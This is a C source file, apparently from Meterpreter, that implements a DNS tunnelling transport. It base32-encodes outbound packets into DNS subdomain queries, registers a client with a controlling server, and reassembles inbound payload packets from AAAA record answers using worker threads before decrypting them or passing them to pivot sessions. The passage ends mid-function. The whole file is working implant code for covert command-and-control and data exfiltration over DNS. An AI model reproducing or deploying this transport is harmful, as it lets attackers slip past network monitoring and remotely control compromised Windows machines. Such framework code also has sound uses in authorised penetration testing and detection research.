/*!
 * @file server_transport_windns.c
 * @remark This file doesn't use precompiled headers because metsrv.h includes a bunch of
 *         of definitions that clash with those found in winhttp.h. Hooray Win32 API. I hate you.
 */
#include "../../common/common.h"
#include "../../common/config.h"
#include "server_transport_windns.h"
#include "../../common/packet_encryption.h"
#include "../../common/pivot_packet_dispatch.h"

void ngx_txid_base32_encode(wchar_t *dst, unsigned char *src, size_t len) {
    const wchar_t *tbl = L"abcdefghijklmnopqrstuvwxyz234567";

    while (len > 0) {
        dst[0] = 0;
        dst[1] = 0;
        dst[2] = 0;
        dst[3] = 0;
        dst[4] = 0;
        dst[5] = 0;
        dst[6] = 0;
        dst[7] = 0;

        switch (len) {
        default:
            dst[7] |= src[4] & 0x1F;
            dst[6] |= src[4] >> 5;
        case 4:
            dst[6] |= (src[3] << 3) & 0x1F;
            dst[5] |= (src[3] >> 2) & 0x1F;
            dst[4] |= src[3] >> 7;
        case 3:
            dst[4] |= (src[2] << 1) & 0x1F;
            dst[3] |= (src[2] >> 4) & 0x1F;
        case 2:
            dst[3] |= (src[1] << 4) & 0x1F;
            dst[2] |= (src[1] >> 1) & 0x1F;
            dst[1] |= (src[1] >> 6) & 0x1F;
        case 1:
            dst[1] |= (src[0] << 2) & 0x1F;
            dst[0] |= src[0] >> 3;
        }

        int j;
        for (j = 0; j < 8; j++) {
            dst[j] = tbl[dst[j]];
        }

        if (len < 5) {
            dst[7] = L'=';
            if (len < 4) {
                dst[6] = L'=';
                dst[5] = L'=';
                if (len < 3) {
                    dst[4] = L'=';
                    if (len < 2) {
                        dst[3] = L'=';
                        dst[2] = L'=';
                    }
                }
            }
            break;
        }

        len -= 5;
        src += 5;
        dst += 8;
    }
}

size_t
ngx_txid_base32_encode_len(size_t len) {
    return (len + 4) / 5 * 8;
}

DWORD WINAPI ThreadProc(DNSThreadParams *lpParam) {
    USHORT counter_start = 0;
    USHORT *counter = &counter_start;
    wchar_t sub_c[7];
    wchar_t idx_sub[7];
    

    DnsTunnel* xxx[17];
    DNS_STATUS dns_status;
    PDNS_RECORD result = NULL;
    PDNS_RECORD result_iter = NULL;
    wchar_t *request = NULL;

    //WaitForSingleObject(lpParam->mutex, INFINITE);
    PIP4_ARRAY pSrvList = lpParam->pSrvList;
    wchar_t * domain = lpParam->domain;
    wchar_t * sub_seq = lpParam->subd;
    wchar_t * client_id = lpParam->client_id;
    xxx[0] = NULL;
    int cur_idx = lpParam->index;
    //ReleaseMutex(lpParam->mutex);
    
    UINT current_recieved = 0;
    
    request = (wchar_t *)calloc(250, sizeof(wchar_t));
    result_iter = (PDNS_RECORD)calloc(1, sizeof(DNS_RECORD));
    
    for (; cur_idx < lpParam->index_stop; cur_idx++){
        DWORD tries = 1000;
        do {
            
            memset(request, 0, sizeof(request));
            
            _itow_s(*counter, sub_c, 6, 10);
            _itow_s(cur_idx, idx_sub, 6, 10);
            ++(*counter);

            wcscat_s(request, 250, sub_seq);
            wcscat_s(request, 250, L".");
            wcscat_s(request, 250, idx_sub);
            wcscat_s(request, 250, L".");
            wcscat_s(request, 250, sub_c);
            wcscat_s(request, 250, L".");
            wcscat_s(request, 250, client_id);
            wcscat_s(request, 250, L".");
            wcscat_s(request, 250, domain);

            //vdprintf("[PACKET RECEIVE WINDNS] SECOND request: %S", request);

            tries--;
            dns_status = DnsQuery_W(request, DNS_TYPE_AAAA, DNS_QUERY_RETURN_MESSAGE | DNS_QUERY_BYPASS_CACHE | DNS_QUERY_NO_HOSTS_FILE, pSrvList, &result, NULL);
            //vdprintf("[PACKET RECEIVE WINDNS] %d RESULT request: %S - %d   %d", cur_idx, request, dns_status, tries);
            
            
        } while (dns_status != 0 && tries > 0);

        BOOL force_stop = FALSE;
        
        for (int i = 0; i < 17; i++) {
            xxx[i] = NULL;
        }
        
        if (dns_status == 0 && tries > 0) {
           
            if (result->Data.AAAA.Ip6Address.IP6Byte != NULL) {

                //result_iter = (PDNS_RECORD)calloc(1, sizeof(DNS_RECORD));
                
                memset(result_iter, 0, sizeof(DNS_RECORD));
                result_iter->pNext = result;

                do {
                    result_iter = result_iter->pNext;
                    DnsTunnel* tmp = ((DnsTunnel *)result_iter->Data.AAAA.Ip6Address.IP6Byte);

                    if (tmp->ff == 0xfe)
                    {
                        xxx[16] = tmp;
                    }
                    else if (tmp->ff == 0xff) {
                        UINT idx = ((UCHAR)(tmp->index_size) >> 4);
                        if (idx < 16) {
                            xxx[idx] = tmp;
                        }
                        else {
                            vdprintf("[PACKET RECEIVE WINDNS] DNS INDEX error");
                            force_stop = TRUE;
                            //if (lpParam->result == NULL) {
                            //    SAFE_FREE(lpParam->result);
                            //}
                            //lpParam->result = NULL;
                            lpParam->size = 0;
                            lpParam->status = ERROR_READ_FAULT;
                            break;
                        }

                    }else{
                        vdprintf("[PACKET RECEIVE WINDNS] DNS FLAG error");
                        force_stop = TRUE;
                        //if (lpParam->result == NULL) {
                        //    SAFE_FREE(lpParam->result);
                        //}
                        //lpParam->result = NULL;
                        lpParam->size = 0;
                        lpParam->status = ERROR_READ_FAULT;
                        break;
                    }

                } while (result_iter->pNext != NULL);
            }

            if (force_stop) break;

            UINT i = 0;
            


            //WaitForSingleObject(lpParam->mutex, INFINITE);
            

            while (i < 17 && xxx[i] != NULL) {
                if ((xxx[i]->index_size & 0x0f) <= 0x0e) {
                    //vdprintf("[PACKET RECEIVE WINDNS] %d, reading: %S - %d %S %S", cur_idx, sub_seq, (xxx[i]->index_size & 0x0f), sub_seq, request);
                    memcpy(lpParam->result + current_recieved, xxx[i]->block.data, (xxx[i]->index_size & 0x0f)); // copy packet
                    current_recieved += (xxx[i]->index_size & 0x0f);
                    lpParam->size = current_recieved;
                }
                else {
                    vdprintf("[PACKET RECEIVE WINDNS] INDEX2 overflow error");
                    force_stop = TRUE; // ERROR
                    //if (lpParam->result == NULL) {
                    //    SAFE_FREE(lpParam->result);
                    //}
                    //lpParam->result = NULL;
                    lpParam->size = 0;
                    lpParam->status = ERROR_READ_FAULT;
                    break;
                }
                i++;

            }
            
            if (force_stop) break;
            
            //ReleaseMutex(lpParam->mutex);
            lpParam->status = dns_status;
        }
        else {
            vdprintf("[PACKET RECEIVE WINDNS] HEADER NOT FOUND error 2");
            lpParam->status = dns_status;
            break;
        }
    }
    
    //WaitForSingleObject(lpParam->mutex, INFINITE);
    vdprintf("[PACKET RECEIVE WINDNS] %d END %S got %d %S %S", cur_idx, request, lpParam->size, sub_seq, request);
    if (request != NULL) {
        SAFE_FREE(request);
    }
    if (result_iter!=NULL){
        SAFE_FREE(result_iter);
    }
    //ReleaseMutex(lpParam->mutex);
    //Sleep(500);
    ExitThread(0);
}


  


/*!
 * @brief Wrapper around DNS-specific sending functionality.
 * @param hReq DNS request domain.
 * @return An indication of the result of sending the request.
 */
BOOL get_packet_from_windns(wchar_t * domain, wchar_t * sub_seq, PUSHORT counter,IncapuslatedDns *recieve, PIP4_ARRAY pip4, wchar_t* reqz, wchar_t* client_id)
{
    
    DWORD tries = 1000;

    DnsTunnel* xxx[17];
    wchar_t sub_c[7];
    UINT current_recieved = 0;
    UINT need_to_recieve = 0;
    BOOL ready = FALSE;
    DNS_STATUS dns_status;
    PDNS_RECORD result = NULL;
    PDNS_RECORD result_iter = NULL;
    wchar_t *request;
    wchar_t *sub_seq_orig = _wcsdup(sub_seq);
    
    xxx[0] = NULL;

    do {
        request = (wchar_t *)calloc(250, sizeof(wchar_t));

        for (int i = 1; i < 17; i++){
            xxx[i] = NULL;
        }

        _itow_s(*counter, sub_c, 6, 10);
        ++(*counter);

        wcscat_s(request, 250, sub_seq);
        wcscat_s(request, 250, L".");
        wcscat_s(request, 250, reqz);
        wcscat_s(request, 250, L".");
        wcscat_s(request, 250, sub_c);
        wcscat_s(request, 250, L".");
        wcscat_s(request, 250, client_id);
        wcscat_s(request, 250, L".");
        wcscat_s(request, 250, domain);

        vdprintf("[PACKET RECEIVE WINDNS] request: %S", request);
        dns_status = DnsQuery_W(request, DNS_TYPE_AAAA, DNS_QUERY_RETURN_MESSAGE|DNS_QUERY_BYPASS_CACHE|DNS_QUERY_NO_HOSTS_FILE, pip4, &result, NULL);
        
        SAFE_FREE(request);
        vdprintf("[PACKET RECEIVE WINDNS] DnsQuery status code is %d", dns_status);
        
        if (dns_status != 0) {
            
            tries--;
            continue;
        }

        if (result->Data.AAAA.Ip6Address.IP6Byte != NULL) {
            

            result_iter = (PDNS_RECORD)calloc(1, sizeof(DNS_RECORD));
            result_iter->pNext = result;
            
            do {
                result_iter = result_iter->pNext;
                DnsTunnel* tmp = ((DnsTunnel *)result_iter->Data.AAAA.Ip6Address.IP6Byte);


                if ((UCHAR)(tmp->index_size) == 0x81 && tmp->ff == 0xfe)
                {
                    xxx[0] = tmp;
                }

            } while (result_iter->pNext != NULL);


            if (xxx[0] != NULL && (xxx[0]->block.header.status_flag == 0 || xxx[0]->block.header.status_flag == 1)){
                memcpy(sub_seq, xxx[0]->block.header.next_sub_seq, 8);
                need_to_recieve = xxx[0]->block.header.size;
                break;
            }
            else
            {
                vdprintf("[PACKET RECEIVE WINDNS] HEADER NOT FOUND error");
                break;
            }
        }
        else {
            vdprintf("[PACKET RECEIVE WINDNS] NO IP");
            tries--;
            continue;
        }
    } while (tries > 0);
    
    BOOL break_loop = FALSE;
    
    if (need_to_recieve > 0){ 
        recieve->packet = (PUCHAR)calloc(xxx[0]->block.header.size, sizeof(char));
        vdprintf("[PACKET RECEIVE WINDNS] need more bytes: %d", need_to_recieve);
        HANDLE hThreads[THREADS_MAX];
        DNSThreadParams thread_params[THREADS_MAX];
    
        UINT requests = need_to_recieve / 238 + ((need_to_recieve % 238) > 0 ? 1 : 0);
        vdprintf("[PACKET RECEIVE WINDNS] need more requests: %d", requests);

        UINT iterations = requests / (THREADS_MAX);
        UINT iterations_last = (requests % THREADS_MAX);
        
        UINT curr_idx = 0;
        HANDLE hMutex = CreateMutex(NULL, FALSE, NULL);
        
        
        
        //for (UINT i = 0; i < iterations && break_loop!=TRUE; i++)
        //{
            //UINT i = 0;
        int created_threads = 0;
        if (requests <= THREADS_MAX) {
            iterations = 1;
            iterations_last = 1;
            created_threads = requests;
        } else {
            created_threads = THREADS_MAX;
            iterations_last += iterations;
        }
        
        vdprintf("[PACKET RECEIVE WINDNS] will do in %d threads  - %d, %d", created_threads, iterations, iterations_last);
        
        int y = 0;
        for (; y < created_threads ; y++)
        {
            UINT last_idx = curr_idx + ( y == (THREADS_MAX - 1) ? iterations_last : iterations );
            thread_params[y].mutex = &hMutex;
            thread_params[y].domain = domain;
            thread_params[y].client_id = client_id;
            thread_params[y].subd = sub_seq_orig;
            thread_params[y].pSrvList = pip4;
            thread_params[y].result = (UCHAR *)calloc(238 * ( y == (THREADS_MAX - 1) ? iterations_last : iterations ), sizeof(UCHAR));
            thread_params[y].size = 0;
            thread_params[y].status = 1;
            thread_params[y].index = curr_idx;
            thread_params[y].index_stop = last_idx;
            
            vdprintf("[PACKET RECEIVE WINDNS] START %d .. %d %S %S", curr_idx, last_idx, domain, sub_seq_orig);
               
            hThreads[y] = CreateThread(NULL, 0, &ThreadProc, &thread_params[y], 0, NULL);
                
            if (NULL == hThreads[y]) {
                vdprintf("Failed to create thread.\r\n");
            }
                
            curr_idx = last_idx;
        }
            
            
        WaitForMultipleObjects(y, hThreads, TRUE, INFINITE);


        for (int y = 0; y < created_threads && break_loop!=TRUE; y++)
        {
            vdprintf("[PACKET RECEIVE WINDNS] FINISH got %S, %d [%d]", thread_params[y].subd, thread_params[y].size,y);
            if (thread_params[y].status == 0 && thread_params[y].size > 0){
                    
                memcpy(recieve->packet + current_recieved, thread_params[y].result, thread_params[y].size);
                current_recieved += thread_params[y].size;
                
                    
            } else {
                dns_status = thread_params[y].status;
                break_loop = TRUE;
            }
                
            //CLEAN 
            thread_params[y].domain = NULL;
            thread_params[y].client_id = NULL;
            thread_params[y].subd = NULL;
            thread_params[y].status = 1;
            SAFE_FREE(thread_params[y].result);
            thread_params[y].size = 0;
        }
        //}
    }
    
    SAFE_FREE(sub_seq_orig);
  
    vdprintf("[PACKET RECEIVE WINDNS] recieved %d bytes from %d", current_recieved, need_to_recieve);
    
    if (need_to_recieve == current_recieved && break_loop == FALSE  && tries > 0){

        if (need_to_recieve == 0)
        {
            recieve->status = DNS_INFO_NO_RECORDS;
            recieve->size = 0;
            vdprintf("[PACKET RECEIVE WINDNS] NO RECORDS");
        }
        else {
            recieve->status = ERROR_SUCCESS;
            recieve->size = need_to_recieve;
            vdprintf("[PACKET RECEIVE WINDNS] PACKET READY");
        }
    }
    else{
        if (recieve->packet != NULL){
            SAFE_FREE(recieve->packet);
            recieve->size = 0;
        }

        vdprintf("[PACKET RECEIVE WINDNS] recv. error %d", dns_status);
        recieve->status = ERROR_READ_FAULT;
        recieve->size = 0;
        return FALSE;
    }

    vdprintf("[PACKET RECEIVE WINDNS] packet recieved with size (%d)",recieve->size);
    
    return TRUE;
}  
    
    

/*!
 * @brief Wrapper around DNS-specific sending functionality.
 * @param hReq DNS request handle.
 * @param buffer Pointer to the buffer to receive the data.
 * @param size Buffer size.
 * @return An indication of the result of sending the request.
 */
static BOOL send_request_windns(wchar_t * domain, wchar_t * subdomain, wchar_t* reqz, PUSHORT counter, PIP4_ARRAY pip4, LPVOID buffer, DWORD size, wchar_t* client_id, IncapuslatedDns *recieved)
{
    BOOL data = FALSE;
    
        if(buffer == NULL || size == 0){
            data = get_packet_from_windns(domain, subdomain, counter, recieved, pip4, reqz, client_id);
        } else if (buffer != NULL && size > 0) {
            data = FALSE;
        }
        
    return data;
}


/*!
 * @brief Windows-specific function to transmit a packet via DNS
 * @param remote Pointer to the \c Remote instance.
 * @param packet Pointer to the \c Packet that is to be sent.
 * @param completion Pointer to the completion routines to process.
 * @return An indication of the result of processing the transmission request.
 * @remark This function is not available on POSIX.
 */
static DWORD packet_transmit_dns(Remote *remote, LPBYTE packet, DWORD packetLength)
{
    DWORD ret = 0;
    DWORD tries = 100;
    DnsTransportContext* ctx = (DnsTransportContext*)remote->transport->ctx;
    unsigned char *buffer;
    wchar_t *base64 = NULL;
    //BOOL res;
    DWORD index = 0;
    wchar_t idx_c[7];
    wchar_t sub_c[7];
    wchar_t padd[2];
    DWORD rest_len;
    DWORD parts;
    DWORD parts_last;
    DWORD shift;
    DWORD current_sent = 0;
    DWORD need_to_send = 0;
    BOOL force_next;
    BOOL force_stop;
    DNS_STATUS dns_status;
    PDNS_RECORD result = NULL;
    PDNS_RECORD result_iter = NULL;
    PUSHORT counter = &ctx->counter;
    PIP4_ARRAY pSrvList = (PIP4_ARRAY)ctx->pip4;
    wchar_t *domain = ctx->domain;
    wchar_t *client_id = ctx->client_id;
    wchar_t *request = NULL;

    if (ctx->ready == FALSE){
        SetLastError(ERROR_NOT_FOUND);
        return 0;
    }
    buffer = malloc(packetLength);
    if (!buffer)
    {
        SetLastError(ERROR_NOT_FOUND);
        return 0;
    }

    memcpy(buffer, &packet, packetLength);

    DWORD  buffLen = packetLength;
    need_to_send = ((buffLen/5) + (buffLen % 5 > 0 ? 1 : 0)) * 8 ;
    
    base64 = (wchar_t *)calloc(need_to_send + 1, sizeof(wchar_t));
    
    ngx_txid_base32_encode(base64, buffer, buffLen);
    
    vdprintf("[PACKET TRANCIEVE WINDNS] BEFOR: '%S'",base64);
    DWORD padd_ = 0;
    
    
    while (base64[need_to_send - 1] == L'=') { 
        --need_to_send;  
        padd_++;
    };

    DWORD i = 0;
    
    vdprintf("[PACKET TRANCIEVE WINDNS] AFT: '%S'",base64);
    wcscpy_s(base64 + need_to_send, 1, L"\x00");

    
    do{
        request = (wchar_t *)calloc(MAX_DNS_NAME_SIZE + 1, sizeof(wchar_t));
        _itow_s(need_to_send, request, MAX_DNS_NAME_SIZE, 10);
        _itow_s(*counter, sub_c, 6, 10);
        vdprintf("[PACKET TRANCIEVE WINDNS] padding1: %d", padd_);
        _itow_s(padd_, padd, 2, 10);
        vdprintf("[PACKET TRANCIEVE WINDNS] padding2: %S", padd);
        wcscat_s(request, MAX_DNS_NAME_SIZE, L".");
        wcscat_s(request, MAX_DNS_NAME_SIZE, padd);
        wcscat_s(request, MAX_DNS_NAME_SIZE, L".tx.");
        wcscat_s(request, MAX_DNS_NAME_SIZE, sub_c);
        wcscat_s(request, MAX_DNS_NAME_SIZE, L".");
        wcscat_s(request, MAX_DNS_NAME_SIZE, client_id);
        wcscat_s(request, MAX_DNS_NAME_SIZE, L".");
        wcscat_s(request, MAX_DNS_NAME_SIZE, domain);
        force_stop = FALSE;
        vdprintf("[PACKET TRANCIEVE WINDNS] HEADER request: %S", request);
        dns_status = DnsQuery_W(request, DNS_TYPE_AAAA, DNS_QUERY_RETURN_MESSAGE|DNS_QUERY_BYPASS_CACHE|DNS_QUERY_NO_HOSTS_FILE, pSrvList, &result, NULL);
        SAFE_FREE(request);
        if (dns_status != 0) {
            vdprintf("[PACKET TRANCIEVE WINDNS] DnsQuery status code is %d", dns_status);
            tries--;
            ++(*counter);
            ret = dns_status;
            continue;
        }

        DnsTunnel* tmp = ((DnsTunnel *)result->Data.AAAA.Ip6Address.IP6Byte);
        if (tmp != NULL && tmp->block.header.status_flag == 0){
            force_stop = TRUE;
        }
        else {
            vdprintf("[PACKET TRANCIEVE WINDNS] Header error");
            ret = DNS_ERROR_INVALID_IP_ADDRESS;
            tries--;
        }
        
    } while (force_stop == FALSE && tries > 0);

    if (force_stop == TRUE){

        do {
            if (request!=NULL) SAFE_FREE(request);
             
            _itow_s(*counter, sub_c, 6, 10);
            _itow_s(index, idx_c, 6, 10);
            
            force_next = FALSE;
            force_stop = FALSE;

            request = (wchar_t *)calloc(MAX_DNS_NAME_SIZE + 1, sizeof(wchar_t));
            rest_len = MAX_DNS_NAME_SIZE - ((DWORD)wcslen(domain)) - 7 - ((DWORD)wcslen(sub_c)) - ((DWORD)wcslen(idx_c)) - ((DWORD)wcslen(client_id));
            rest_len = min(rest_len, need_to_send - current_sent);
            parts = rest_len / (MAX_DNS_SUBNAME_SIZE + 1);
            parts_last = rest_len % (MAX_DNS_SUBNAME_SIZE + 1);
            rest_len -= parts;

            DWORD i = 0;
            DWORD shift2 = current_sent;
            shift = 0;
            
            wcsncat_s(request, MAX_DNS_NAME_SIZE,L"t.",2);
            
            for (; i < parts; i++){
                
                wcsncat_s(request, MAX_DNS_NAME_SIZE, base64 + shift2, MAX_DNS_SUBNAME_SIZE);
                shift += MAX_DNS_SUBNAME_SIZE;
                shift2 += MAX_DNS_SUBNAME_SIZE;
                wcsncat_s(request, MAX_DNS_NAME_SIZE, L".", 1);
                shift += 1;
            }

            if (parts_last > 0){
                wcsncat_s(request, MAX_DNS_NAME_SIZE, base64 + shift2, parts_last);
                shift += parts_last;
                shift2 += parts_last;
                wcsncat_s(request, MAX_DNS_NAME_SIZE, L".", 1);
            }

            wcscat_s(request, MAX_DNS_NAME_SIZE, idx_c);
            wcscat_s(request, MAX_DNS_NAME_SIZE, L".");
            wcscat_s(request, MAX_DNS_NAME_SIZE, sub_c);
            wcscat_s(request, MAX_DNS_NAME_SIZE, L".");
            wcscat_s(request, MAX_DNS_NAME_SIZE, client_id);
            wcscat_s(request, MAX_DNS_NAME_SIZE, L".");
            wcscat_s(request, MAX_DNS_NAME_SIZE, domain);
            wcscat_s(request, MAX_DNS_NAME_SIZE, L"\x00");

            vdprintf("[PACKET TRANCIEVE WINDNS] request: %S", request);

            dns_status = DnsQuery_W(request, DNS_TYPE_AAAA, DNS_QUERY_RETURN_MESSAGE|DNS_QUERY_BYPASS_CACHE|DNS_QUERY_NO_HOSTS_FILE, pSrvList, &result, NULL);
            SAFE_FREE(request);

            if (dns_status != 0) {
                vdprintf("[PACKET TRANCIEVE WINDNS] DnsQuery status code is %d", dns_status);
                tries--;
                ++(*counter);
                //Sleep(1000);
                force_next = TRUE;
                ret = dns_status;
                //recieve->status = ERROR_READ_FAULT;
                continue;
            }



            if (result->Data.AAAA.Ip6Address.IP6Byte != NULL) {
                DnsTunnel* tmp = ((DnsTunnel *)result->Data.AAAA.Ip6Address.IP6Byte);
                if (tmp->index_size == 0xff && tmp->block.header.status_flag == 0xf0)
                {
                    current_sent = shift2;
                    ++(*counter);
                    index++;
                    vdprintf("[PACKET TRANCIEVE WINDNS] sent: %d from %d", current_sent, need_to_send);
                }
                else if(tmp->index_size == 0xff && tmp->block.header.status_flag == 0xff && current_sent == need_to_send){
                    current_sent = shift2;
                    ++(*counter);
                    vdprintf("[PACKET TRANCIEVE WINDNS] repeat (finish): %d from %d", current_sent, need_to_send);      
                }
                else {
                    // ERROR
                    vdprintf("[PACKET TRANCIEVE WINDNS] response error, wrong header 0x%x (%d from %d)", tmp->block.header.status_flag, current_sent, need_to_send);
                    ret = DNS_ERROR_INVALID_IP_ADDRESS;
                    force_stop = TRUE;
                }
            }
            else {
                vdprintf("[PACKET TRANCIEVE WINDNS] response error, no data");
                tries--;
                ++(*counter);
                force_next = TRUE;
                ret = DNS_ERROR_NO_PACKET;
                continue;

            }



        } while ((force_next == TRUE && tries > 0) || (force_stop == FALSE && tries > 0 && current_sent != need_to_send));
    }

    SAFE_FREE(buffer);
    SAFE_FREE(base64);
    vdprintf("[PACKET TRANCIEVE WINDNS] res: %d %d ",current_sent, need_to_send);
    if (force_stop == FALSE && tries > 0 && current_sent == need_to_send){
        vdprintf("[PACKET TRANCIEVE WINDNS] cool");
        ret = ERROR_SUCCESS;
    }

    return ret;
}

/*!
 * @brief Transmit a packet via DNS.
 * @param remote Pointer to the \c Remote instance.
 * @param packet Pointer to the \c Packet that is to be sent.
 * @param completion Pointer to the completion routines to process.
 * @return An indication of the result of processing the transmission request.
 */
static DWORD packet_transmit_via_dns(Remote *remote, LPBYTE rawPacket, DWORD rawPacketLength)
{
    DWORD res;
    dprintf("[PACKET DNS] TRANSMIT... 1 %p", rawPacket);
    lock_acquire(remote->lock);
    do
    {
        res = packet_transmit_dns(remote, rawPacket, rawPacketLength);
        if (res != 0)
        {
            dprintf("[PACKET] transmit failed with return %d\n", res);
            SetLastError(res);
            break;
        }

        SetLastError(ERROR_SUCCESS);
    } while (0);

    res = GetLastError();
    lock_release(remote->lock);
    return res;
}

/*!
 * @brief Windows-specific function to register a new client via DNS.
 * @param remote Pointer to the \c Remote instance.
 * @param packet Pointer to a pointer that will receive the \c Packet data.
 * @return An indication of the result of processing the transmission request.
 * @remark This function is not available in POSIX.
 */
static DWORD register_dns(DnsTransportContext* ctx)
{
    DWORD tries = 10;

    DnsTunnel* xxx[17];
    wchar_t sub_c[7];
    //UINT current_recieved = 0;
    //UINT need_to_recieve = 0;
    BOOL ready = FALSE;
    DNS_STATUS dns_status;
    PDNS_RECORD result = NULL;
    PDNS_RECORD result_iter = NULL;
    wchar_t *request;
    PUSHORT counter = &ctx->counter;
    //wchar_t *sub_seq_orig = _wcsdup(sub_seq);
    
    xxx[0] = NULL;

    do {
        request = (wchar_t *)calloc(250, sizeof(wchar_t));

        for (int i = 1; i < 17; i++){
            xxx[i] = NULL;
        }

        _itow_s(*counter, sub_c, 6, 10);
        ++(*counter);

        wcscat_s(request, 250, L"7812.reg0.");
        wcscat_s(request, 250, sub_c);
        wcscat_s(request, 250, L".");
        wcscat_s(request, 250, ctx->server_id);
        wcscat_s(request, 250, L".");
        wcscat_s(request, 250, ctx->domain);

        vdprintf("[PACKET RECEIVE WINDNS] request: %S", request);
        dns_status = DnsQuery_W(request, DNS_TYPE_AAAA, DNS_QUERY_RETURN_MESSAGE|DNS_QUERY_BYPASS_CACHE|DNS_QUERY_NO_HOSTS_FILE, ctx->pip4, &result, NULL);
        
        SAFE_FREE(request);
        vdprintf("[PACKET RECEIVE WINDNS] DnsQuery status code is %d", dns_status);
        
        if (dns_status != 0) {
            
            tries--;
            continue;
        }

        if (result->Data.AAAA.Ip6Address.IP6Byte != NULL) {
            

            result_iter = (PDNS_RECORD)calloc(1, sizeof(DNS_RECORD));
            result_iter->pNext = result;
            
            do {
                result_iter = result_iter->pNext;
                DnsTunnel* tmp = ((DnsTunnel *)result_iter->Data.AAAA.Ip6Address.IP6Byte);


                if ((UCHAR)(tmp->index_size) == 0xff && tmp->ff == 0xff)
                {
                    xxx[0] = tmp;
                    break;
                }

            } while (result_iter->pNext != NULL);

            vdprintf("[PACKET RECEIVE WINDNS] CLIENT ID0: '%x'", xxx[0]->block.data[0]);
            vdprintf("[PACKET RECEIVE WINDNS] CLIENT ID0: '%c'", xxx[0]->block.data[0]);
            vdprintf("[PACKET RECEIVE WINDNS] CLIENT ID1: '%x'", xxx[0]->block.data[1]);

            if (xxx[0] != NULL && xxx[0]->block.data[1] == 0){
                vdprintf("[PACKET RECEIVE WINDNS] CLIENT ID: '%x'", xxx[0]->block.data[0]);
                if(ctx->client_id) SAFE_FREE(ctx->client_id);
                ctx->client_id= (wchar_t*)calloc(2,sizeof(wchar_t));
                swprintf(ctx->client_id, 2*sizeof(wchar_t), L"%c", xxx[0]->block.data[0]);
                ctx->ready = TRUE;
                break;
            }
            else 
            {
                vdprintf("[PACKET RECEIVE WINDNS] HEADER NOT FOUND error");
                tries--;
                continue;
            }
        }
        else {
            vdprintf("[PACKET RECEIVE WINDNS] NO IP");
            tries--;
            continue;
        }
    } while (tries > 0);   
    
    
    return ctx->ready;
}

/*!
 * @brief Windows-specific function to receive a new packet via DNS.
 * @param remote Pointer to the \c Remote instance.
 * @param packet Pointer to a pointer that will receive the \c Packet data.
 * @return An indication of the result of processing the transmission request.
 * @remark This function is not available in POSIX.
 */
static DWORD packet_receive_dns(Remote *remote, Packet **packet)
{
    DWORD headerBytes = 0, payloadBytesLeft = 0, res = ERROR_SUCCESS;
    Packet *localPacket = NULL;
    PacketHeader header;
    //LONG bytesRead;
    BOOL inHeader = TRUE;
    PUCHAR payload = NULL;
    ULONG payloadLength = 0;
    DnsTransportContext* ctx = (DnsTransportContext*)remote->transport->ctx;
    DWORD retries = 5;
    IncapuslatedDns recieved;
    wchar_t *sub_seq = L"aaaa";
    
    recieved.packet = NULL;
    
    lock_acquire(remote->lock);
    
    
    if (ctx->ready == TRUE){
        vdprintf("[PACKET RECEIVE DNS] sending req: %S", ctx->domain);
        BOOL rcvStatus = send_request_windns(ctx->domain, sub_seq, L"g", &ctx->counter, ctx->pip4, NULL, 0, ctx->client_id, &recieved);

        if (rcvStatus == TRUE && recieved.status == ERROR_SUCCESS) // Handle response
        {
            vdprintf("[PACKET RECEIVE DNS] Data recieved: %u bytes", recieved.size);
            
            //read header
            memcpy(&header, recieved.packet, sizeof(PacketHeader));
            dprintf("[PACKET RECEIVE DNS] decoding header");
           
            // xor the header data
            xor_bytes(header.xor_key, (PUCHAR)&header + sizeof(header.xor_key), sizeof(PacketHeader) - sizeof(header.xor_key));
#ifdef DEBUGTRACE
            PUCHAR h = (PUCHAR)&header;
            vdprintf("[PACKET RECEIVE DNS] Packet header: [0x%02X 0x%02X 0x%02X 0x%02X] [0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X] [0x%02X 0x%02X 0x%02X 0x%02X] [0x%02X 0x%02X 0x%02X 0x%02X] [0x%02X 0x%02X 0x%02X 0x%02X]",
                h[0], h[1], h[2], h[3], h[4], h[5], h[6], h[7], h[8], h[9], h[10], h[11], h[12], h[13], h[14], h[15], h[16], h[17], h[18], h[19], h[20], h[21], h[22], h[23], h[24], h[25], h[26], h[27], h[28], h[29], h[30], h[31]);
#endif
            //header.length = ntohl(header.length);
            //dprintf("[PACKET RECEIVE DNS] key:0x%x len:0x%x",header.xor_key, header.length);
            // Initialize the header
            vdprintf("[PACKET RECEIVE DNS] tlv length: %d", ntohl(header.length));
            // use TlvHeader size here, because the length doesn't include the xor byte
            payloadLength = ntohl(header.length) - sizeof(TlvHeader);
            vdprintf("[PACKET RECEIVE DNS] Payload length is %d", payloadLength);
            DWORD packetSize = sizeof(PacketHeader) + payloadLength;
            vdprintf("[PACKET RECEIVE DNS] total buffer size for the packet is %d", packetSize);
            // Allocate the payload
            if (!(payload = (PUCHAR)malloc(packetSize)))
            {
                SetLastError(ERROR_NOT_ENOUGH_MEMORY);
                vdprintf("[PACKET RECEIVE DNS] ERROR_NOT_ENOUGH_MEMORY");
            
            } else {
               
                dprintf("[PACKET RECEIVE DNS] alloc %d", packetSize);
                memcpy_s(payload, packetSize, recieved.packet, packetSize);
                    
#ifdef DEBUGTRACE
                h = (PUCHAR)&header.session_guid[0];
                dprintf("[PACKET RECEIVE DNS] Packet Session GUID: %02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X",
                    h[0], h[1], h[2], h[3], h[4], h[5], h[6], h[7], h[8], h[9], h[10], h[11], h[12], h[13], h[14], h[15]);
#endif
                if (is_null_guid(header.session_guid) || memcmp(remote->orig_config->session.session_guid, header.session_guid, sizeof(header.session_guid)) == 0)
                {
                    dprintf("[PACKET RECEIVE DNS] Session GUIDs match (or packet guid is null), decrypting packet");
                    SetLastError(decrypt_packet(remote, packet, payload, packetSize));
                }
                else
                {
                    dprintf("[TCP] Session GUIDs don't match, looking for a pivot");
                    PivotContext* pivotCtx = pivot_tree_find(remote->pivot_sessions, header.session_guid);
                    if (pivotCtx != NULL)
                    {
                        dprintf("[TCP] Pivot found, dispatching packet on a thread (to avoid main thread blocking)");
                        SetLastError(pivot_packet_dispatch(pivotCtx, payload, packetSize));

                        // mark this packet buffer as NULL as the thread will clean it up
                        payload = NULL;
                        *packet = NULL;
                    }
                    else
                    {
                        dprintf("[TCP] Session GUIDs don't match, can't find pivot!");
                    }
                }
            }
            
            // Cleanup on failure
            if (res != ERROR_SUCCESS)
